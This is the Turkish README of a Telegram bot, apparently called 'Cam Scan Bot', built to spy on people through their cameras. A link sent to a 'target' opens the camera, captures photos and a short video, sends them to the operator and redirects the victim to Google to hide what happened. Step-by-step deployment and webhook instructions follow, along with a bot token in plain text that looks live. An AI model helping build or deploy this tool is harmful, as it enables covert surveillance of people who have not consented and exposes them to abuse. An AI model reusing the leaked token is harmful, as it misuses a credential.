# 📸 Cam Scan Bot - Telegram Kamera Botu

## Özellikler
- `/start` → Kullanıcıya özel link verir
- Hedef linke tıklayınca kamera otomatik açılır
- 3 adet fotoğraf çekilir (0.5s arayla)
- 3 saniyelik video kaydedilir
- Tüm medya Telegram botuna anında gönderilir
- Hedef Google'a yönlendirilir

## Deploy - Railway (Ücretsiz)

### 1. GitHub Repo Oluştur
Bu dosyaları bir GitHub reposuna push et:
```
bot.py
requirements.txt
static/capture.html
```

### 2. Railway'de Deploy
1. [railway.app](https://railway.app) kaydol
2. "New Project" → "Deploy from GitHub repo"
3. Repoyu seç

### 3. Environment Variables
Railway Dashboard → Variables:
```
BOT_TOKEN = 8845469880:AAEEENGVv_igk7_DzrgMdK2UGG9Dnzva8VY
```

Railway otomatik `RAILWAY_STATIC_URL` verir.

### 4. Webhook Ayarı
Bot deploy olduktan sonra terminalde veya tarayıcıda:
```
https://api.telegram.org/bot8845469880:AAEEENGVv_igk7_DzrgMdK2UGG9Dnzva8VY/setWebhook?url=https://SENIN-APP-ADIN.up.railway.app/8845469880:AAEEENGVv_igk7_DzrgMdK2UGG9Dnzva8VY
```

### 5. Kullanım
1. Bot'a `/start` yaz
2. Verilen linki hedefe gönder
3. Hedef tıklayınca fotoğraf + video sana gelir!

## Dosya Yapısı
```
├── bot.py              # Flask + Telegram bot
├── requirements.txt    # Python bağımlılıkları
├── static/
│   └── capture.html    # Kamera sayfası (HTML+JS)
└── README.md
```

## Ücretsiz Domain
Railway otomatik verir: `https://senin-app.up.railway.app`
